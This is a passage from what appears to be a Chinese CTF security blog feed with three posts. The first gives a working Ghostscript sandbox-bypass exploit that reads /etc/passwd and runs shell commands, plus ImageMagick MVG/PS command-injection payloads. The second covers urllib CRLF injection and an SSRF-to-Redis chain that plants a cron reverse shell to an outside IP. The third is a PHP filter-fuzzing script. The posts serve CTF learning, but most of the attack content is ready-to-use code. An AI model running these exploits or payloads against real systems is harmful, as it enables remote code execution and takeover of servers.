class="code"><pre><span class="line">% extract .actual_pdfpaintproc operator from pdfdict</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">&#x2F;.actual_pdfpaintproc pdfdict &#x2F;.actual_pdfpaintproc get def</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">&#x2F;exploit &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">    (Stage 11: Exploitation...)&#x3D;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">    &#x2F;forceput exch def</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">    systemdict &#x2F;SAFER false forceput</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">    userparams &#x2F;LockFilePermissions false forceput</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">    systemdict &#x2F;userparams get &#x2F;PermitFileControl [(*)] forceput</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">    systemdict &#x2F;userparams get &#x2F;PermitFileWriting [(*)] forceput</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">    systemdict &#x2F;userparams get &#x2F;PermitFileReading [(*)] forceput</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">    % update</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">    save restore</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">    % All done.</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">    stop</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">&#125; def</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">errordict &#x2F;typecheck &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">    &#x2F;typecount typecount 1 add def</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">    (Stage 10: &#x2F;typecheck #)&#x3D;only typecount &#x3D;&#x3D;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">    % The first error will be the .knownget, which we handle and setup the</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">    % stack. The second error will be the ifelse (missing boolean), and then we</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">    % dump the operands.</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line">    typecount 1 eq &#123; null &#125; if</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">    typecount 2 eq &#123; pop 7 get exploit &#125; if</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line">    typecount 3 eq &#123; (unexpected)&#x3D; quit &#125;  if</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line">&#125; put</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line">% The pseudo-operator .actual_pdfpaintproc from pdf_draw.ps pushes some</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line">% executable arrays onto the operand stack that contain .forceput, but are not</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line">% marked as executeonly or pseudo-operators.</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">40</span></pre></td><td class="code"><pre><span class="line">%</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">41</span></pre></td><td class="code"><pre><span class="line">% The routine was attempting to pass them to ifelse, but we can cause that to</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">42</span></pre></td><td class="code"><pre><span class="line">% fail because when the routine was declared, it used &#96;bind&#96; but many of the</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">43</span></pre></td><td class="code"><pre><span class="line">% names it uses are not operators and so are just looked up in the dictstack.</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">44</span></pre></td><td class="code"><pre><span class="line">%</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">45</span></pre></td><td class="code"><pre><span class="line">% This means we can push a dict onto the dictstack and control how the routine</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">46</span></pre></td><td class="code"><pre><span class="line">% works.</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">47</span></pre></td><td class="code"><pre><span class="line">&lt;&lt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">48</span></pre></td><td class="code"><pre><span class="line">    &#x2F;typecount      0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">49</span></pre></td><td class="code"><pre><span class="line">    &#x2F;PDFfile        &#123; (Stage 0: PDFfile)&#x3D; currentfile &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">50</span></pre></td><td class="code"><pre><span class="line">    &#x2F;q              &#123; (Stage 1: q)&#x3D; &#125; % no-op</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">51</span></pre></td><td class="code"><pre><span class="line">    &#x2F;oget           &#123; (Stage 3: oget)&#x3D; pop pop 0 &#125; % clear stack</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">52</span></pre></td><td class="code"><pre><span class="line">    &#x2F;pdfemptycount  &#123; (Stage 4: pdfemptycount)&#x3D; &#125; % no-op</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">53</span></pre></td><td class="code"><pre><span class="line">    &#x2F;gput           &#123; (Stage 5: gput)&#x3D; &#125;  % no-op</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">54</span></pre></td><td class="code"><pre><span class="line">    &#x2F;resolvestream  &#123; (Stage 6: resolvestream)&#x3D; &#125; % no-op</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">55</span></pre></td><td class="code"><pre><span class="line">    &#x2F;pdfopdict      &#123; (Stage 7: pdfopdict)&#x3D; &#125; % no-op</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">56</span></pre></td><td class="code"><pre><span class="line">    &#x2F;.pdfruncontext &#123; (Stage 8: .pdfruncontext)&#x3D; 0 1 mark &#125; % satisfy counttomark and index</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">57</span></pre></td><td class="code"><pre><span class="line">    &#x2F;pdfdict        &#123; (Stage 9: pdfdict)&#x3D;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">58</span></pre></td><td class="code"><pre><span class="line">        % cause a &#x2F;typecheck error we handle above</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">59</span></pre></td><td class="code"><pre><span class="line">        true</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">60</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">61</span></pre></td><td class="code"><pre><span class="line">&gt;&gt; begin &lt;&lt;&gt;&gt; &lt;&lt;&gt;&gt; &#123; .actual_pdfpaintproc &#125; stopped pop</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">62</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">63</span></pre></td><td class="code"><pre><span class="line">(Should now have complete control over ghostscript, attempting to read &#x2F;etc&#x2F;passwd...)&#x3D;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">64</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">65</span></pre></td><td class="code"><pre><span class="line">% Demonstrate reading a file we shouldnt have access to.</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">66</span></pre></td><td class="code"><pre><span class="line">(&#x2F;etc&#x2F;passwd) (r) file dup 64 string readline pop &#x3D;&#x3D; closefile</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">67</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">68</span></pre></td><td class="code"><pre><span class="line">(Attempting to execute a shell command...)&#x3D; flush</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">69</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">70</span></pre></td><td class="code"><pre><span class="line">% run command</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">71</span></pre></td><td class="code"><pre><span class="line">(%pipe%id &gt; &#x2F;tmp&#x2F;success) (w) file closefile</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">72</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">73</span></pre></td><td class="code"><pre><span class="line">(All done.)&#x3D;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">74</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">75</span></pre></td><td class="code"><pre><span class="line">quit</span></pre></td></tr></table></figure></li></ul><ul><li><h2 id="绕过getimagesize，执行new-ImageMagick-漏洞"><a href="#绕过getimagesize，执行new-ImageMagick-漏洞" class="headerlink" title="绕过getimagesize，执行new ImageMagick()漏洞"></a>绕过getimagesize，执行new ImageMagick()漏洞</h2><ul><li><h3 id="mvg格式的POC-："><a href="#mvg格式的POC-：" class="headerlink" title="mvg格式的POC ："></a>mvg格式的POC ：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">push graphic-context</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">viewbox 0 0 640 480</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">fill &#39;url(https:&#x2F;&#x2F;127.0.0.0&#x2F;oops.jpg&quot;|&quot;&#96;id&#96;)&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">pop graphic-context</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">#define xlogo_width 200</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">#define xlogo_height 200</span></pre></td></tr></table></figure><ul><li><p>xbm图片是一个文本格式的文件，而不像其他图片一样是二进制文件。如果某一行格式满足</p><p><code>#define %s %d</code>，那么取出其中的字符串和数字，再从字符串中取出<code>width</code>或<code>height</code>，将数字作为图片的长和宽。</p></li><li><p>后面两句，使其正常判断mvg格式文件的大小</p></li></ul></li><li><h4 id="ps文件poc"><a href="#ps文件poc" class="headerlink" title="ps文件poc"></a>ps文件poc</h4><ul><li><p>借助CVE-2018-16509的POC </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">poc.png</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">__________________________________________________________________________________________</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">%!PS</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">userdict &#x2F;setpagedevice undef</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">save</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">legal</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">&#123; legal &#125; stopped &#123; pop &#125; if</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">restore</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">mark &#x2F;OutputFile (%pipe%id) currentdevice putdeviceprops</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">&#x2F;test &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">#define xlogo64_width 64</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">#define xlogo64_height 64</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure></li></ul></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      在ctf的图片操作中，利用此模块代码的漏洞进行绕过。
    
    </summary>
    
    
      <category term="漏洞" scheme="http://h3art3ars.github.io/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="ctf" scheme="http://h3art3ars.github.io/tags/ctf/"/>
    
      <category term="漏洞" scheme="http://h3art3ars.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="绕过" scheme="http://h3art3ars.github.io/tags/%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
  <entry>
    <title>urllib-vul</title>
    <link href="http://h3art3ars.github.io/2019/12/11/urllib-vul/"/>
    <id>http://h3art3ars.github.io/2019/12/11/urllib-vul/</id>
    <published>2019-12-11T07:38:30.000Z</published>
    <updated>2019-12-11T07:41:27.469Z</updated>
    
    <content type="html"><![CDATA[<h1 id="urllib-CRLF注入"><a href="#urllib-CRLF注入" class="headerlink" title="urllib  CRLF注入"></a>urllib  CRLF注入</h1><ul><li>CVE-2016-5699： <code>http://[vps-ip]%0d%0aX-injected:%20header%0d%0atest:5555</code></li><li>CVE-2019-9740： <code>http://[vps-ip]%0d%0a%0d%0aheaders:5555</code></li><li>CVE-2019-9947： <code>http://[vps-ip]:5555?%0d%0apayload%0d%0apadding</code></li><li><code>http://[vps-ip]:5555/%0d%0apayload%0d%0apadding</code></li></ul><h2 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python3</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">import sys</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">import urllib</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">import urllib.error</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">import urllib.request</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">url &#x3D; sys.argv[1]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">try:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">    info &#x3D; urllib.request.urlopen(url).info()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">    print(info)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">except urllib.error.URLError as e:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">    print(e)</span></pre></td></tr></table></figure><p>在vps监听</p><p><code>nc -lvvp 5555</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">listening on [any] 7777 ...</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">connect to [127.0.0.1] from localhost [127.0.0.1] 36252</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">GET &#x2F;?a</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">header::8080&#x2F;test&#x2F;?test&#x3D;a HTTP&#x2F;1.1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">Accept-Encoding: identity</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">Host: 127.0.0.1:7777</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">User-Agent: Python-urllib&#x2F;3.7</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">Connection: close</span></pre></td></tr></table></figure><h2 id="配合ssrf-redis"><a href="#配合ssrf-redis" class="headerlink" title="配合ssrf,redis"></a>配合ssrf,redis</h2><p>利用CVE-2016-5699 redis未授权访问 计划任务反弹shell</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1%0d%0a*3%0d%0a%243%0d%0aset%0d%0a%241%0d%0a1%0d%0a%2462%0d%0a%0d%0a*%2F1%20*%20*%20*%20*%20%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F111.231.169.25%2F5555%200%3E%261%0a%0d%0aconfig%20set%20dir%20%2Fvar%2Fspool%2Fcron%2Fcrontabs%0d%0aconfig%20set%20dbfilename%20root%0d%0asave%0d%0a:6379</span></pre></td></tr></table></figure><p> 如果urllib2抛出<code>URLError:</code>的异常</p><p>可尝试将%2F双重编码 </p><p>url过长也可能抛出异常，可以分为几个url</p><p>urldecode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">*3</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$3</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">set</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">$1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">$62</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">*&#x2F;1 * * * * &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;111.231.169.25&#x2F;5555 0&gt;&amp;1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">config set dbfilename root</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">save</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">:6379</span></pre></td></tr></table></figure><p> Redis的通讯协议 （ 突破空格的限制）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">*3 &#x2F;&#x2F;表示3个参数</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$3 &#x2F;&#x2F;下面的参数有3个字节</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">set</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">$1 &#x2F;&#x2F;表示下一个参数有一个字节</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">$62 &#x2F;&#x2F;表示下一个参数有六十二个字节（加上第一个%0a）</span></pre></td></tr></table></figure><p>不同操作系统的系统任务调度文件 </p><p>用户 XXX 调度文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">ubuntu 下路径</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;xxx</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">Alpine 下路径</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;cron.d&#x2F;xxx</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">debian 下的路径（xxx 可以是任意东西）</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;cron.d&#x2F;xxx</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">或者</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;xxx</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">但是写这个路径的时候，文件内不能加用户名。</span></pre></td></tr></table></figure><p>参考</p><p><a href="https://security.tencent.com/index.php/blog/msg/106" target="_blank" rel="noopener">Hack Redis via Python urllib HTTP Header Injection</a></p><p><a href="https://strcpy.me/index.php/archives/749/" target="_blank" rel="noopener">Python urllib HTTP头注入漏洞</a></p><p>[<a href="https://www.cnblogs.com/v1vvwv/p/how-to-use-crontab-to-getshell.html" target="_blank" rel="noopener">linux 定时任务 crontab 反弹 shell</a>]</p><p><a href="https://xuanxuanblingbling.github.io/ctf/web/2019/10/13/complex/" target="_blank" rel="noopener">THUCTF2019之ComplexWeb</a></p>]]></content>
    
    <summary type="html">
    
      利用python的urllib CRLF漏洞，进行内网的redis利用
    
    </summary>
    
    
      <category term="漏洞" scheme="http://h3art3ars.github.io/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="ctf" scheme="http://h3art3ars.github.io/tags/ctf/"/>
    
      <category term="漏洞" scheme="http://h3art3ars.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="python" scheme="http://h3art3ars.github.io/tags/python/"/>
    
      <category term="技巧" scheme="http://h3art3ars.github.io/tags/%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title>phpfuzz</title>
    <link href="http://h3art3ars.github.io/2019/12/11/phpfuzz/"/>
    <id>http://h3art3ars.github.io/2019/12/11/phpfuzz/</id>
    <published>2019-12-11T07:30:00.000Z</published>
    <updated>2019-12-11T07:32:32.121Z</updated>
    
    <content type="html"><![CDATA[<h3 id="php代码审计（含过滤）"><a href="#php代码审计（含过滤）" class="headerlink" title="php代码审计（含过滤）"></a>php代码审计（含过滤）</h3><ul><li><p>先理清楚<a href="https://regex101.com/" target="_blank" rel="noopener">正则</a>过滤，寻找漏过</p></li><li><p>再使用以下脚本fuzz过滤的php函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$allPHPfunNum &#x3D; count(get_defined_functions()[internal]);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">echo &quot;当前版本PHP的所有内置php函数数量为&quot;.$allPHPfunNum.&quot;&lt;br&gt;&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">$a &#x3D; array();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">$b &#x3D; 0;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">for($i&#x3D;0; $i &lt; $allPHPfunNum; $i++)&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">    $Fun &#x3D; get_defined_functions()[internal][$i];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">  if(!preg_match(&#39;&#x2F;_|readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log&#x2F;i&#39;, $Fun))&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">        $a[$b]&#x3D;$Fun;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">        $b++;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">echo &quot;满足过滤条件的函数数量为&quot;.count($a).&quot;&lt;br&gt;&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">print_r($a);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure><p>php读取文件函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">file()      &#x2F;&#x2F;把文件读入一个数组中。</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">fopen()    &#x2F;&#x2F;打开一个文件或 URL。</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">fread()    &#x2F;&#x2F;        读取打开的文件。</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">fgets()   &#x2F;&#x2F;从打开的文件中返回一行。</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">fgetss()   &#x2F;&#x2F;从打开的文件中读取一行并过滤掉 HTML 和 PHP 标记。</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">fgetc()  &#x2F;&#x2F;从打开的文件中返回字符。</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">dirname() &#x2F;&#x2F;返回路径中的目录名称部分。</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">readfile() &#x2F;&#x2F;读取一个文件，并输出到输出缓冲。</span></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
